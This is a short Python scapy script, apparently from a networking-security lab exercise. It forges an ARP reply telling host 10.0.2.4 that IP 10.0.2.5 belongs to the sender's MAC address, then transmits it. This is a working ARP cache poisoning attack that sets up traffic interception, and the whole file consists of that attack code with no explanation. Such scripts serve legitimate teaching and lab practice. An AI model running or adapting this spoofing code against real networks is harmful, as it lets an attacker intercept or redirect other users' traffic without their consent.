#!/usr/bin/python3
from scapy.all import *

E = Ether(dst="08:00:27:1b:11:df", src="08:00:27:aa:b1:56")
A = ARP(hwsrc="08:00:27:aa:b1:56", psrc="10.0.2.5", hwdst="08:00:27:1b:11:df", pdst="10.0.2.4", op=2)
pkt = E/A
sendp(pkt)
